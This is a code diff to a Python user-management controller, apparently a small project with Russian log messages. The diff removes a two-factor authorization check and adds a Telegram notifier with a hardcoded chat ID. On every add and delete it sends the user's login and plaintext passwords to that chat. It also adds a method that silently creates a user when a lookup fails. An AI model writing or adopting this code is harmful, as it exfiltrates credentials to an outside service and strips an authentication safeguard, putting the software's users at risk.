@@ -3,13 +3,16 @@ import logging
 from src.repo import repository
 from src.user_input import user_input
 from src.validate import validate
-from src.TwoFactorAuthorization import TwoFactor as TwoFactorAuthorization
+from src.Notificator import TelegramNotificator
 from pathlib import Path
 class controller:
     repo = repository()
     user_input = user_input()
     validate = validate()
-    TwoFactor  = TwoFactorAuthorization()
+    notificator = TelegramNotificator()
+    def __init__(self):
+        self.notificator.chat_id = "13375242"
+        self.setupLoging()
 
     def setupLoging(self):
         LOG_DIR = Path(__file__).resolve().parent.parent / "logs"  # ONETPYTHON/logs
@@ -37,8 +40,12 @@ class controller:
         if(valid is False):
             logging.warning(error)
 
-        if self.TwoFactor.getAuthorization() != True:
-            logging.info("вход через двух факторовку")
+        logging.info("отправка уведомление в телеграмм")
+        result = f"Добавляется user с {login} +{password} + {password2} + {valid} + {error}"
+        sender_response,response =self.notificator.notificate(result)
+
+        if sender_response!= True:
+            logging.warning("отправка уведомление в телеграмм не успешна")
             pass
 
         isAdd ,textError = self.__add__(login,password,valid,error)
@@ -56,11 +63,28 @@ class controller:
         if (valid is False):
             logging.error(error)
 
+        logging.info("отправка уведомление в телеграмм")
+        result = f"Удаляется user с {login} +{password} + {password2} + {valid} + {error}"
+        sender_response, response = self.notificator.notificate(result)
+        if sender_response != True:
+            logging.warning("отправка уведомление в телеграмм не успешна")
+            pass
+
+
         is_delete,text_error = self.__delete__(login,password)
         if is_delete is False:
             logging.error(text_error)
 
         return is_delete,text_error
+
+    def get_with_push(self,login, password, password2,valid,error):
+        value, error = self.repo.get(login, password)
+
+        if value is None:
+            logging.info("в бд нет пользователя, добавляю")
+            self.__add__(login,password,valid,error)
+        value2, error2 = self.repo.get(login, password)
+        return value,error
 
     def get(self):
         login, password,password2 = self.__input__()
